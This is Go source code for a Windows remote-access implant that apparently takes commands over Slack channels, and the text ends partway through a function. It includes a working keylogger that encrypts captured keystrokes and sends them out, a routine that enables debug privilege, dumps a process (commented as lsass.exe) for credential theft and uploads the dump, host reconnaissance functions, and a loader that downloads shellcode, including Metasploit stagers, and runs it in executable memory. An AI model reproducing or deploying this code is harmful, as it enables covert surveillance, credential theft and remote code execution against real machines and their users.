package main

//These are my imports
import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/atotto/clipboard"
	"github.com/bmatcuk/doublestar"
	"github.com/kbinani/screenshot"
	"github.com/miekg/dns"
	"golang.org/x/sys/windows"
)

//Global variables
var keylogger = false
var beacon = 5
var processed_ids []string
var responses = "RESPONSE_CHANNEL"
var registration = "REGISTRATION_CHANNEL"
var commands = "COMMANDS_CHANNEL"
var bearer = "BEARERTOKEN"
var token = "TOKENTOKEN"
var key = "AESKEY"
var keyBytes = []byte(key)
var iv = []byte("1337133713371337")

type AES_CBC struct{}

func checkErr(err error) { //Checks for errors
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// MEM_RELEASE is a Windows constant used with Windows API calls
	MEM_RELEASE = 0x8000
	// PAGE_EXECUTE is a Windows constant used with Windows API calls
	PAGE_EXECUTE = 0x10
	// PAGE_EXECUTE_READWRITE is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READWRITE = 0x40
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
	// PROCESS_CREATE_THREAD is a Windows constant used with Windows API calls
	PROCESS_CREATE_THREAD = 0x0002
	// PROCESS_VM_READ is a Windows constant used with Windows API calls
	PROCESS_VM_READ = 0x0010
	//PROCESS_VM_WRITE is a Windows constant used with Windows API calls
	PROCESS_VM_WRITE = 0x0020
	// PROCESS_VM_OPERATION is a Windows constant used with Windows API calls
	PROCESS_VM_OPERATION = 0x0008
	// PROCESS_QUERY_INFORMATION is a Windows constant used with Windows API calls
	PROCESS_QUERY_INFORMATION = 0x0400
	// TH32CS_SNAPHEAPLIST is a Windows constant used with Windows API calls
	TH32CS_SNAPHEAPLIST = 0x00000001
	// TH32CS_SNAPMODULE is a Windows constant used with Windows API calls
	TH32CS_SNAPMODULE = 0x00000008
	// TH32CS_SNAPPROCESS is a Windows constant used with Windows API calls
	TH32CS_SNAPPROCESS = 0x00000002
	// TH32CS_SNAPTHREAD is a Windows constant used with Windows API calls
	TH32CS_SNAPTHREAD = 0x00000004
	// THREAD_SET_CONTEXT is a Windows constant used with Windows API calls
	THREAD_SET_CONTEXT   = 0x0010
	ERROR_ALREADY_EXISTS = 183

	// Virtual-Key Codes
	vk_BACK       = 0x08
	vk_TAB        = 0x09
	vk_CLEAR      = 0x0C
	vk_RETURN     = 0x0D
	vk_SHIFT      = 0x10
	vk_CONTROL    = 0x11
	vk_MENU       = 0x12
	vk_PAUSE      = 0x13
	vk_CAPITAL    = 0x14
	vk_ESCAPE     = 0x1B
	vk_SPACE      = 0x20
	vk_PRIOR      = 0x21
	vk_NEXT       = 0x22
	vk_END        = 0x23
	vk_HOME       = 0x24
	vk_LEFT       = 0x25
	vk_UP         = 0x26
	vk_RIGHT      = 0x27
	vk_DOWN       = 0x28
	vk_SELECT     = 0x29
	vk_PRINT      = 0x2A
	vk_EXECUTE    = 0x2B
	vk_SNAPSHOT   = 0x2C
	vk_INSERT     = 0x2D
	vk_DELETE     = 0x2E
	vk_LWIN       = 0x5B
	vk_RWIN       = 0x5C
	vk_APPS       = 0x5D
	vk_SLEEP      = 0x5F
	vk_NUMPAD0    = 0x60
	vk_NUMPAD1    = 0x61
	vk_NUMPAD2    = 0x62
	vk_NUMPAD3    = 0x63
	vk_NUMPAD4    = 0x64
	vk_NUMPAD5    = 0x65
	vk_NUMPAD6    = 0x66
	vk_NUMPAD7    = 0x67
	vk_NUMPAD8    = 0x68
	vk_NUMPAD9    = 0x69
	vk_MULTIPLY   = 0x6A
	vk_ADD        = 0x6B
	vk_SEPARATOR  = 0x6C
	vk_SUBTRACT   = 0x6D
	vk_DECIMAL    = 0x6E
	vk_DIVIDE     = 0x6F
	vk_F1         = 0x70
	vk_F2         = 0x71
	vk_F3         = 0x72
	vk_F4         = 0x73
	vk_F5         = 0x74
	vk_F6         = 0x75
	vk_F7         = 0x76
	vk_F8         = 0x77
	vk_F9         = 0x78
	vk_F10        = 0x79
	vk_F11        = 0x7A
	vk_F12        = 0x7B
	vk_NUMLOCK    = 0x90
	vk_SCROLL     = 0x91
	vk_LSHIFT     = 0xA0
	vk_RSHIFT     = 0xA1
	vk_LCONTROL   = 0xA2
	vk_RCONTROL   = 0xA3
	vk_LMENU      = 0xA4
	vk_RMENU      = 0xA5
	vk_OEM_1      = 0xBA
	vk_OEM_PLUS   = 0xBB
	vk_OEM_COMMA  = 0xBC
	vk_OEM_MINUS  = 0xBD
	vk_OEM_PERIOD = 0xBE
	vk_OEM_2      = 0xBF
	vk_OEM_3      = 0xC0
	vk_OEM_4      = 0xDB
	vk_OEM_5      = 0xDC
	vk_OEM_6      = 0xDD
	vk_OEM_7      = 0xDE
	vk_OEM_8      = 0xDF
)

type MinidumpFile struct {
	ProcName    string
	ProcID      uint32
	FileContent []byte
}

var (
	dll, _              = syscall.LoadDLL("user32.dll")
	GetAsyncKeyState, _ = dll.FindProc("GetAsyncKeyState")
	tmpKeylog           string
	shift               bool
	caps                bool
)

func keyscan(client_id, job_id, mode string) { //Stops, starts, or dumps the keylog buffer
	switch mode {
	case "start":
		if keylogger == false {
			keylogger = true
			go Keylogger()
		}
	case "stop":
		keylogger = false

	case "dump":
		encryptedOutput, _ := Encrypt([]byte(tmpKeylog))
		SendResult(client_id, job_id, "output", encryptedOutput)
		tmpKeylog = ""
	}

}

func Keylogger() { //Constantly checks for active key presses
	for {
		if keylogger == false { // End function if keylogger is shut off
			return
		}
		time.Sleep(1 * time.Millisecond)
		shiftchk, _, _ := GetAsyncKeyState.Call(uintptr(vk_SHIFT))
		if shiftchk == 0x8000 {
			shift = true
		} else {
			shift = false
		}
		for i := 0; i < 256; i++ {
			Result, _, _ := GetAsyncKeyState.Call(uintptr(i))

			if Result&0x1 == 0 {
				continue
			}
			switch i {
			case vk_CONTROL:
				tmpKeylog += "[Ctrl]"
			case vk_BACK:
				tmpKeylog += "[Back]"
			case vk_TAB:
				tmpKeylog += "[Tab]"
			case vk_RETURN:
				tmpKeylog += "[Enter]\r\n"
			case vk_SHIFT:
				tmpKeylog += "[Shift]"
			case vk_MENU:
				tmpKeylog += "[Alt]"
			case vk_CAPITAL:
				tmpKeylog += "[CapsLock]"
				if caps {
					caps = false
				} else {
					caps = true
				}
			case vk_ESCAPE:
				tmpKeylog += "[Esc]"
			case vk_SPACE:
				tmpKeylog += " "
			case vk_PRIOR:
				tmpKeylog += "[PageUp]"
			case vk_NEXT:
				tmpKeylog += "[PageDown]"
			case vk_END:
				tmpKeylog += "[End]"
			case vk_HOME:
				tmpKeylog += "[Home]"
			case vk_LEFT:
				tmpKeylog += "[Left]"
			case vk_UP:
				tmpKeylog += "[Up]"
			case vk_RIGHT:
				tmpKeylog += "[Right]"
			case vk_DOWN:
				tmpKeylog += "[Down]"
			case vk_SELECT:
				tmpKeylog += "[Select]"
			case vk_PRINT:
				tmpKeylog += "[Print]"
			case vk_EXECUTE:
				tmpKeylog += "[Execute]"
			case vk_SNAPSHOT:
				tmpKeylog += "[PrintScreen]"
			case vk_INSERT:
				tmpKeylog += "[Insert]"
			case vk_DELETE:
				tmpKeylog += "[Delete]"
			case vk_LWIN:
				tmpKeylog += "[LeftWindows]"
			case vk_RWIN:
				tmpKeylog += "[RightWindows]"
			case vk_APPS:
				tmpKeylog += "[Applications]"
			case vk_SLEEP:
				tmpKeylog += "[Sleep]"
			case vk_NUMPAD0:
				tmpKeylog += "[Pad 0]"
			case vk_NUMPAD1:
				tmpKeylog += "[Pad 1]"
			case vk_NUMPAD2:
				tmpKeylog += "[Pad 2]"
			case vk_NUMPAD3:
				tmpKeylog += "[Pad 3]"
			case vk_NUMPAD4:
				tmpKeylog += "[Pad 4]"
			case vk_NUMPAD5:
				tmpKeylog += "[Pad 5]"
			case vk_NUMPAD6:
				tmpKeylog += "[Pad 6]"
			case vk_NUMPAD7:
				tmpKeylog += "[Pad 7]"
			case vk_NUMPAD8:
				tmpKeylog += "[Pad 8]"
			case vk_NUMPAD9:
				tmpKeylog += "[Pad 9]"
			case vk_MULTIPLY:
				tmpKeylog += "*"
			case vk_ADD:
				if shift {
					tmpKeylog += "+"
				} else {
					tmpKeylog += "="
				}
			case vk_SEPARATOR:
				tmpKeylog += "[Separator]"
			case vk_SUBTRACT:
				if shift {
					tmpKeylog += "_"
				} else {
					tmpKeylog += "-"
				}
			case vk_DECIMAL:
				tmpKeylog += "."
			case vk_DIVIDE:
				tmpKeylog += "[Devide]"
			case vk_F1:
				tmpKeylog += "[F1]"
			case vk_F2:
				tmpKeylog += "[F2]"
			case vk_F3:
				tmpKeylog += "[F3]"
			case vk_F4:
				tmpKeylog += "[F4]"
			case vk_F5:
				tmpKeylog += "[F5]"
			case vk_F6:
				tmpKeylog += "[F6]"
			case vk_F7:
				tmpKeylog += "[F7]"
			case vk_F8:
				tmpKeylog += "[F8]"
			case vk_F9:
				tmpKeylog += "[F9]"
			case vk_F10:
				tmpKeylog += "[F10]"
			case vk_F11:
				tmpKeylog += "[F11]"
			case vk_F12:
				tmpKeylog += "[F12]"
			case vk_NUMLOCK:
				tmpKeylog += "[NumLock]"
			case vk_SCROLL:
				tmpKeylog += "[ScrollLock]"
			case vk_LSHIFT:
				tmpKeylog += "[LeftShift]"
			case vk_RSHIFT:
				tmpKeylog += "[RightShift]"
			case vk_LCONTROL:
				tmpKeylog += "[LeftCtrl]"
			case vk_RCONTROL:
				tmpKeylog += "[RightCtrl]"
			case vk_LMENU:
				tmpKeylog += "[LeftMenu]"
			case vk_RMENU:
				tmpKeylog += "[RightMenu]"
			case vk_OEM_1:
				if shift {
					tmpKeylog += ":"
				} else {
					tmpKeylog += ";"
				}
			case vk_OEM_2:
				if shift {
					tmpKeylog += "?"
				} else {
					tmpKeylog += "/"
				}
			case vk_OEM_3:
				if shift {
					tmpKeylog += "~"
				} else {
					tmpKeylog += "`"
				}
			case vk_OEM_4:
				if shift {
					tmpKeylog += "{"
				} else {
					tmpKeylog += "["
				}
			case vk_OEM_5:
				if shift {
					tmpKeylog += "|"
				} else {
					tmpKeylog += "\\"
				}
			case vk_OEM_6:
				if shift {
					tmpKeylog += "}"
				} else {
					tmpKeylog += "]"
				}
			case vk_OEM_7:
				if shift {
					tmpKeylog += `"`
				} else {
					tmpKeylog += "'"
				}
			case vk_OEM_PERIOD:
				if shift {
					tmpKeylog += ">"
				} else {
					tmpKeylog += "."
				}
			case 0x30:
				if shift {
					tmpKeylog += ")"
				} else {
					tmpKeylog += "0"
				}
			case 0x31:
				if shift {
					tmpKeylog += "!"
				} else {
					tmpKeylog += "1"
				}
			case 0x32:
				if shift {
					tmpKeylog += "@"
				} else {
					tmpKeylog += "2"
				}
			case 0x33:
				if shift {
					tmpKeylog += "#"
				} else {
					tmpKeylog += "3"
				}
			case 0x34:
				if shift {
					tmpKeylog += "$"
				} else {
					tmpKeylog += "4"
				}
			case 0x35:
				if shift {
					tmpKeylog += "%"
				} else {
					tmpKeylog += "5"
				}
			case 0x36:
				if shift {
					tmpKeylog += "^"
				} else {
					tmpKeylog += "6"
				}
			case 0x37:
				if shift {
					tmpKeylog += "&"
				} else {
					tmpKeylog += "7"
				}
			case 0x38:
				if shift {
					tmpKeylog += "*"
				} else {
					tmpKeylog += "8"
				}
			case 0x39:
				if shift {
					tmpKeylog += "("
				} else {
					tmpKeylog += "9"
				}
			case 0x41:
				if caps || shift {
					tmpKeylog += "A"
				} else {
					tmpKeylog += "a"
				}
			case 0x42:
				if caps || shift {
					tmpKeylog += "B"
				} else {
					tmpKeylog += "b"
				}
			case 0x43:
				if caps || shift {
					tmpKeylog += "C"
				} else {
					tmpKeylog += "c"
				}
			case 0x44:
				if caps || shift {
					tmpKeylog += "D"
				} else {
					tmpKeylog += "d"
				}
			case 0x45:
				if caps || shift {
					tmpKeylog += "E"
				} else {
					tmpKeylog += "e"
				}
			case 0x46:
				if caps || shift {
					tmpKeylog += "F"
				} else {
					tmpKeylog += "f"
				}
			case 0x47:
				if caps || shift {
					tmpKeylog += "G"
				} else {
					tmpKeylog += "g"
				}
			case 0x48:
				if caps || shift {
					tmpKeylog += "H"
				} else {
					tmpKeylog += "h"
				}
			case 0x49:
				if caps || shift {
					tmpKeylog += "I"
				} else {
					tmpKeylog += "i"
				}
			case 0x4A:
				if caps || shift {
					tmpKeylog += "J"
				} else {
					tmpKeylog += "j"
				}
			case 0x4B:
				if caps || shift {
					tmpKeylog += "K"
				} else {
					tmpKeylog += "k"
				}
			case 0x4C:
				if caps || shift {
					tmpKeylog += "L"
				} else {
					tmpKeylog += "l"
				}
			case 0x4D:
				if caps || shift {
					tmpKeylog += "M"
				} else {
					tmpKeylog += "m"
				}
			case 0x4E:
				if caps || shift {
					tmpKeylog += "N"
				} else {
					tmpKeylog += "n"
				}
			case 0x4F:
				if caps || shift {
					tmpKeylog += "O"
				} else {
					tmpKeylog += "o"
				}
			case 0x50:
				if caps || shift {
					tmpKeylog += "P"
				} else {
					tmpKeylog += "p"
				}
			case 0x51:
				if caps || shift {
					tmpKeylog += "Q"
				} else {
					tmpKeylog += "q"
				}
			case 0x52:
				if caps || shift {
					tmpKeylog += "R"
				} else {
					tmpKeylog += "r"
				}
			case 0x53:
				if caps || shift {
					tmpKeylog += "S"
				} else {
					tmpKeylog += "s"
				}
			case 0x54:
				if caps || shift {
					tmpKeylog += "T"
				} else {
					tmpKeylog += "t"
				}
			case 0x55:
				if caps || shift {
					tmpKeylog += "U"
				} else {
					tmpKeylog += "u"
				}
			case 0x56:
				if caps || shift {
					tmpKeylog += "V"
				} else {
					tmpKeylog += "v"
				}
			case 0x57:
				if caps || shift {
					tmpKeylog += "W"
				} else {
					tmpKeylog += "w"
				}
			case 0x58:
				if caps || shift {
					tmpKeylog += "X"
				} else {
					tmpKeylog += "x"
				}
			case 0x59:
				if caps || shift {
					tmpKeylog += "Y"
				} else {
					tmpKeylog += "y"
				}
			case 0x5A:
				if caps || shift {
					tmpKeylog += "Z"
				} else {
					tmpKeylog += "z"
				}
			}
		}
	}
}

func miniDump(tempDir string, process string, ClientID string, JobID string) (MinidumpFile, error) {
	// All code written by C-Sto  https://github.com/Ne0nd0g/merlin/blob/master/pkg/modules/minidump/minidump.go

	ret := MinidumpFile{} // []byte{}
	var err error
	// Make sure temporary directory exists before executing miniDump functionality
	if tempDir != "" {
		d, errS := os.Stat(tempDir)
		if os.IsNotExist(errS) {
			return ret, fmt.Errorf("the provided directory does not exist: %s", tempDir)
		}
		if d.IsDir() != true {
			return ret, fmt.Errorf("the provided path is not a valid directory: %s", tempDir)
		}
	} else {
		tempDir = os.TempDir()
	}

	// Get the process PID or name
	ret.ProcName, ret.ProcID, err = getProcess(process, 0)
	if err != nil {
		return ret, err
	}

	// Get debug privs (required for dumping processes not owned by current user)
	err = sePrivEnable("SeDebugPrivilege")
	if err != nil {
		return ret, err
	}

	// Get a handle to process
	hProc, err := syscall.OpenProcess(0x1F0FFF, false, ret.ProcID) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
	if err != nil {
		return ret, err
	}

	// Set up the temporary file to write to, automatically remove it once done
	// TODO: Work out how to do this in memory

	//f, tempErr := ioutil.TempFile(tempDir, "*.tmp")
	f, tempErr := os.Create("C:\\Users\\Public\\" + ClientID + ".dmp")
	if tempErr != nil {
		return ret, tempErr
	}

	// Remove the file after the function exits, regardless of error nor not
	// Upload here
	//defer os.Remove(f.Name())

	// Load MiniDumpWriteDump function from DbgHelp.dll
	k32 := windows.NewLazySystemDLL("DbgHelp.dll")
	miniDump := k32.NewProc("MiniDumpWriteDump")

	/*
		BOOL MiniDumpWriteDump(
		  HANDLE                            hProcess,
		  DWORD                             ProcessId,
		  HANDLE                            hFile,
		  MINIDUMP_TYPE                     DumpType,
		  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
		  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
		  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
		);
	*/
	// Call Windows MiniDumpWriteDump API
	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(ret.ProcID), f.Fd(), 3, 0, 0, 0)

	f.Close()                                                           //idk why this fixes the 'not same as on disk' issue, but it does
	upload_file(ClientID, JobID, "C:\\Users\\Public\\"+ClientID+".dmp") // Upload lsass.exe dump
	deleteFile("C:\\Users\\Public\\" + ClientID + ".dmp")
	if r != 0 {
		ret.FileContent, err = ioutil.ReadFile(f.Name())
		if err != nil {
			f.Close()
			return ret, err
		}
	}
	return ret, nil
}

func sePrivEnable(s string) error {
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}
	type LUID_AND_ATTRIBUTES struct {
		Luid       LUID
		Attributes uint32
	}
	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]LUID_AND_ATTRIBUTES
	}

	modadvapi32 := windows.NewLazySystemDLL("advapi32.dll")
	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
	var tokenHandle syscall.Token
	thsHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}
	syscall.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid LUID
	r, _, e := procLookupPriv.Call(
		uintptr(0), //LPCWSTR lpSystemName,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s))), //LPCWSTR lpName,
		uintptr(unsafe.Pointer(&luid)),                       //PLUID   lpLuid
	)
	if r == 0 {
		return e
	}
	SE_PRIVILEGE_ENABLED := uint32(0x00000002)
	privs := TOKEN_PRIVILEGES{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	//AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)
	r, _, e = procAdjustTokenPrivileges.Call(
		uintptr(tokenHandle),
		uintptr(0),
		uintptr(unsafe.Pointer(&privs)),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)
	if r == 0 {
		return e
	}
	return nil
}
func getProcess(name string, pid uint32) (string, uint32, error) {
	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go

	if pid <= 0 && name == "" {
		return "", 0, fmt.Errorf("a process name OR process ID must be provided")
	}

	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if snapshotHandle < 0 || err != nil {
		return "", 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
	}
	defer syscall.CloseHandle(snapshotHandle)

	var process syscall.ProcessEntry32
	process.Size = uint32(unsafe.Sizeof(process))
	err = syscall.Process32First(snapshotHandle, &process)
	if err != nil {
		return "", 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
	}

	for {
		processName := ""
		// Iterate over characters to build a full string
		for _, chr := range process.ExeFile {
			if chr != 0 {
				processName = processName + string(int(chr))
			}
		}
		if pid > 0 {
			if process.ProcessID == pid {
				return processName, pid, nil
			}
		} else if name != "" {
			if processName == name {
				return name, process.ProcessID, nil
			}
		}
		err = syscall.Process32Next(snapshotHandle, &process)
		if err != nil {
			break
		}
	}
	return "", 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
}

func RandomString(len int) string { //Creates a random string of uppercase letters
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		bytes[i] = byte(65 + rand.Intn(25)) //A=65 and Z = 65+25
	}
	return string(bytes)

}

func randomFloat(min, max float64, n int) []float64 { //Creates a random float between to numbers
	rand.Seed(time.Now().UnixNano())
	res := make([]float64, n)
	for i := range res {
		res[i] = min + rand.Float64()*(max-min)
	}
	return res
}

func stringInSlice(a string, list []string) bool { // A way to check if something is in the slice
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func makeTimestamp(beacon int) string { //This makes the unix timestamp
	t := time.Now().UnixNano() / int64(time.Microsecond)
	//Minus the beacon time and three seconds from the last time it ran
	t = (t / 1000000) - 3 - int64(beacon)
	tee := fmt.Sprint(t)
	return tee
}

func CalculateChecksum(Length int) string { //Creates a checksum, used for metasploit
	for {
		rand.Seed(time.Now().UTC().UnixNano())
		var Checksum string = ""
		var RandString string = ""
		for len(RandString) < Length {
			Temp := rand.Intn(4)
			if Temp == 1 {
				RandString += string(48 + rand.Intn(57-48))
			} else if Temp == 1 {
				RandString += string(65 + rand.Intn(90-65))
			} else if Temp == 3 {
				RandString += string(97 + rand.Intn(122-97))
			}
			Checksum = RandString
		}
		var Temp2 int = 0
		for i := 0; i < len(Checksum); i++ {
			Temp2 += int(Checksum[i])
		}
		if (Temp2 % 0x100) == 92 {
			return Checksum
		}
	}
}

func ByteCountDecimal(b int64) string { // Shows you the file size in human readable format
	const unit = 1000
	if b < unit {
		return fmt.Sprintf("%d B", b)
	}
	div, exp := int64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(b)/float64(div), "kMGTPE"[exp])
}

func spacePad(value string, size string) string { // Pads a string for pretty formatting
	if size == "ts" {
		return fmt.Sprintf("%-28v", value)
	}
	if size == "size" {
		return fmt.Sprintf("%-9v", value)
	}
	return fmt.Sprintf("%-9v", value)
}

func EncryptFile(origData []byte) ([]byte, error) { // Encrypt a file
	block, err := aes.NewCipher(keyBytes)
	if err != nil {
		return nil, err
	}
	blockSize := block.BlockSize()
	origData = PKCS5Padding(origData, blockSize)
	blockMode := cipher.NewCBCEncrypter(block, iv)
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return crypted, nil
}

func DecryptFile(crypted []byte) (string, error) { // Decrypt a file (currently unused)
	decodeData := []byte(crypted)
	block, err := aes.NewCipher(keyBytes)
	if err != nil {
		return "", err
	}
	blockMode := cipher.NewCBCDecrypter(block, iv)
	origData := make([]byte, len(decodeData))
	blockMode.CryptBlocks(origData, decodeData)
	origData = PKCS5UnPadding(origData)
	return string(origData), nil
}

func Encrypt(origData []byte) (string, error) { // Encrypt a string
	block, err := aes.NewCipher(keyBytes)
	if err != nil {
		return "", err
	}
	blockSize := block.BlockSize()
	origData = PKCS5Padding(origData, blockSize)
	blockMode := cipher.NewCBCEncrypter(block, iv)
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return base64.StdEncoding.EncodeToString(crypted), nil
}

func Decrypt(crypted string) (string, error) { // decrypt a string
	decodeData, err := base64.StdEncoding.DecodeString(crypted)
	if err != nil {
		return "", err
	}
	block, err := aes.NewCipher(keyBytes)
	if err != nil {
		return "", err
	}
	blockMode := cipher.NewCBCDecrypter(block, iv)
	origData := make([]byte, len(decodeData))
	blockMode.CryptBlocks(origData, decodeData)
	origData = PKCS5UnPadding(origData)
	return string(origData), nil
}

func ZeroPadding(ciphertext []byte, blockSize int) []byte { //Used for Crypto
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{0}, padding)
	return append(ciphertext, padtext...)
}

func ZeroUnPadding(origData []byte) []byte { //Used for Crypto
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func PKCS5Padding(ciphertext []byte, blockSize int) []byte { //Used for Crypto
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func PKCS5UnPadding(origData []byte) []byte { //Used for Crypto
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func GetLANOutboundIP() string { // Get preferred outbound ip of this machine
	conn, err := net.Dial("udp", "4.5.6.7:1337") //This doesn't actually make a connection
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	IP := localAddr.IP.String()
	return IP

}

func GetWANOutboundIP() string { // Get external WAN outbound ip of this machine
	// high speed response, won't look that weird in DNS logs
	target := "o-o.myaddr.l.google.com"
	server := "ns1.google.com"

	c := dns.Client{}
	m := dns.Msg{}
	m.SetQuestion(target+".", dns.TypeTXT)
	r, _, err := c.Exchange(&m, server+":53")
	if err != nil {
		return ""
	}
	if len(r.Answer) == 0 {
		return ""
	}
	for _, ans := range r.Answer {
		TXTrecord := ans.(*dns.TXT)
		// shouldn't ever be multiple, but provide the full answer if we ever do
		return strings.Join(TXTrecord.Txt, ",")
	}
	return ""
}

func whoami() string { // returns the current user
	user, err := user.Current()
	if err != nil {
		return ("NAME_ERROR")
	}
	return string(user.Username)
}

func checkForAdmin() bool { //attempts to get a file handle on MBR, only Admin can
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func hostname() string { // Returns the computer hostname
	name, err := os.Hostname()
	if err != nil {
		panic(err)
	}
	return name
}

func getVersion() string { //Gets the OS version
	dll := syscall.MustLoadDLL("kernel32.dll")
	p := dll.MustFindProc("GetVersion")
	v, _, _ := p.Call()
	return fmt.Sprintf("Windows version %d.%d (Build %d)\n", byte(v), uint8(v>>8), uint16(v>>16))
}

func SysInfo() string { // Collects system info
	stringy := "Hostname            :   " + hostname() + "\nCurrent User        :   " + whoami() +
		"\nOS Version          :   " + getVersion() + "Go Environment      :   " +
		string(runtime.GOARCH) + "\nCPU cores           :   " + strconv.Itoa(int(runtime.NumCPU()))
	return stringy
}

func ifconfig() string { //Displays IP information of all interfaces
	returnString := "=== interfaces ===\n"
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		returnString += iface.Name + ":\n"
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			addrStr := addr.String()
			split := strings.Split(addrStr, "/")
			addrStr0 := split[0]
			mask := split[1]
			ip := net.ParseIP(addrStr0)
			if ip.To4() != nil {
				returnString += "    IPv4 Address: " + addrStr0 + "/" + mask + "\n"
			} else {
				returnString += "    IPv6 Address: " + addrStr0 + "/" + mask + "\n"
			}
		}
		returnString += "\n"
	}
	return returnString
}

func ls(location string) string { // Lists the files in the given directory
	files, err := ioutil.ReadDir(location)
	if err != nil {
		return "The system cannot find the file specified."
	}
	var result string
	for _, f := range files {
		size := ByteCountDecimal(f.Size())
		timestamp := f.ModTime()
		ts := timestamp.Format("01/02/2006 3:04:05 PM MST")
		dir := "            "
		if f.IsDir() {
			dir = "   <DIR>    "
		}
		result = result + spacePad(ts, "ts") + dir + spacePad(size, "size") + "     " + f.Name() + "\n"
	}
	return result
}

func find(glob string) string { // Searches the current directory for the glob
	filenames, err := doublestar.Glob(glob)
	if err != nil {
		return "Invalid glob pattern."
	}
	var result string
	if len(filenames) > 0 {
		for _, filename := range filenames {
			f, err := os.Stat(filename)
			if err != nil {
				// If we can't stat the file for some reason, don't prevent other results from being returned
				result = result + spacePad("n/a", "ts") + "   <ERR>    " + spacePad("n/a", "size") + "     " + filename + "\n"
				continue
			}
			size := ByteCountDecimal(f.Size())
			timestamp := f.ModTime()
			ts := timestamp.Format("01/02/2006 3:04:05 PM MST")
			dir := "            "
			if f.IsDir() {
				dir = "   <DIR>    "
			}
			result = result + spacePad(ts, "ts") + dir + spacePad(size, "size") + "     " + filename + "\n"
		}
	} else {
		return "No matches."
	}
	return result
}

func deleteFile(path string) string { // Deletes a file

	var err = os.Remove(path)
	if err != nil {
		return "Error, file not found."
	}
	return path + " has been removed."
}

func deleteDir(path string) string { // Deletes a directory
	var err = os.Remove(path)
	if err != nil {
		return "Error, directory not found."
	}
	return path + " has been removed."
}

func cat(path string) string { // Print file content
	path = strings.Replace(path, "\"", "", -1)
	content, err := ioutil.ReadFile(path)
	if err != nil {
		return "Error, file not found."
	}
	return string(content)
}

func makeDir(path string) string { // Make a directory
	var err = os.Mkdir(path, os.FileMode(0522))
	if err != nil {
		return "Error, could not create directory."
	}
	return path + " has been created."
}

func shellcode(Address string, metasploit bool) { // Initiates an HTTPS request to pull shellcode and execute it
	const (
		MEM_COMMIT             = 0x1000
		MEM_RESERVE            = 0x2000
		PAGE_EXECUTE_READWRITE = 0x40
	)

	var (
		kernel32      = syscall.MustLoadDLL("kernel32.dll")
		ntdll         = syscall.MustLoadDLL("ntdll.dll")
		VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
		RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	)
	if metasploit {
		Checksum := CalculateChecksum(12)
		Address += Checksum
	}

	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	client := &http.Client{}
	req, err := http.NewRequest("GET", Address, nil)
	if strings.Contains(Address, "slack.com") {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	Response, netError := client.Do(req)
	if netError != nil {
		fmt.Println("Connection error: " + netError.Error())
	}
	if err != nil {
		log.Fatal(err)
	}
	shellcode, _ := ioutil.ReadAll(Response.Body)
	if len(os.Args) > 1 {
		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
		checkErr(err)
		shellcode = shellcodeFileData
	}
